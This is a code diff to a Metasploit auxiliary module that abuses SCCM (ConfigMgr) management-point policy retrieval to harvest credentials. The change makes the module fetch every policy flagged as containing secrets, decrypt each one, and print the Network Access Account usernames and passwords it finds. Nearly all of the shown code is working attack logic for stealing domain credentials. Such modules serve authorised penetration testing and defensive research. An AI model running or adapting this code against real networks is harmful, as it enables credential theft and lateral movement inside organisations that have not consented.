@@ -13,6 +13,7 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::OptionalSession::LDAP
 
   KEY_SIZE = 2048
+  SECRET_POLICY_FLAG = 4
 
   def initialize(info = {})
     super(
@@ -150,15 +151,19 @@ class MetasploitModule < Msf::Auxiliary
 
     sleep(duration)
 
-    naa_policy_url = get_policies(http_opts, management_point, site_code, key, cert, sms_id)
-    decrypted_policy = request_policy(http_opts, naa_policy_url, sms_id, key)
-    results = get_creds_from_policy_doc(decrypted_policy)
+    secret_urls = get_secret_policies(http_opts, management_point, site_code, key, cert, sms_id)
+    all_results = Set.new
+    secret_urls.each do |url|
+      decrypted_policy = request_policy(http_opts, url, sms_id, key)
+      results = get_creds_from_policy_doc(decrypted_policy)
+      all_results.merge(results)
+    end
 
-    if results.length == 0
+    if all_results.length == 0
       print_status('No NAA credentials configured')
     end
 
-    results.each do |username, password|
+    all_results.each do |username, password|
       print_good("Found valid NAA credentials: #{username}:#{password}")
     end
   rescue SocketError => e
@@ -166,7 +171,7 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def request_policy(http_opts, policy_url, sms_id, key)
-    policy_url.gsub!('http://<mp>', '')
+    policy_url.gsub!(/^https?:\/\/<mp>/, '')
     policy_url = policy_url.gsub('{', '%7B').gsub('}', '%7D')
 
     now = Time.now.utc.iso8601
@@ -230,7 +235,7 @@ class MetasploitModule < Msf::Auxiliary
     decrypted.force_encoding('utf-16le').encode('utf-8').delete_suffix("\x00")
   end
 
-  def get_policies(http_opts, management_point, site_code, key, cert, sms_id)
+  def get_secret_policies(http_opts, management_point, site_code, key, cert, sms_id)
     computer_user = datastore['COMPUTER_USER'].delete_suffix('$')
     fqdn = "#{computer_user}.#{datastore['DOMAIN']}"
     hex_pub_key = make_ms_pubkey(cert.public_key)
@@ -267,14 +272,27 @@ class MetasploitModule < Msf::Auxiliary
 
     compressed_response = Rex::Text.zlib_inflate(response.parts[1].content).force_encoding('utf-16le')
     xml_doc = Nokogiri::XML(compressed_response.encode('utf-8'))
-    naa_policy_url = xml_doc.xpath("//Policy[@PolicyCategory='NAAConfig']/PolicyLocation/text()").text
-    if naa_policy_url.blank?
-      fail_with(Failure::UnexpectedReply, 'Did not retrieve NAA Policy path')
+    policies = xml_doc.xpath("//Policy")
+    secret_policies = policies.select do |policy|
+      flags = policy.attributes['PolicyFlags']
+      next if flags.nil?
+
+      flags.value.to_i & SECRET_POLICY_FLAG == SECRET_POLICY_FLAG
     end
 
-    print_status("Got NAA Policy URL: #{naa_policy_url}")
+    urls = secret_policies.map do |policy|
+      policy.xpath('PolicyLocation/text()').text
+    end
 
-    naa_policy_url
+    urls = urls.select do |url|
+      !url.blank?
+    end
+
+    urls.each do |url|
+      print_status("Found policy containing secrets: #{url}")
+    end
+
+    urls
   end
 
   def rsa_sign(key, data)
@@ -361,7 +379,7 @@ class MetasploitModule < Msf::Auxiliary
   def get_creds_from_policy_doc(policy)
     xml_doc = Nokogiri::XML(policy)
     naa_sections = xml_doc.xpath(".//instance[@class='CCM_NetworkAccessAccount']")
-    results = Set.new
+    results = []
     naa_sections.each do |section|
       username = section.xpath("property[@name='NetworkAccessUsername']/value").text
       username = deobfuscate_policy_value(username)
@@ -373,7 +391,7 @@ class MetasploitModule < Msf::Auxiliary
 
       unless username.blank? && password.blank?
         # Deleted credentials seem to result in just an empty value for username and password
-        results.add([username, password])
+        results.append([username, password])
       end
     end
     results
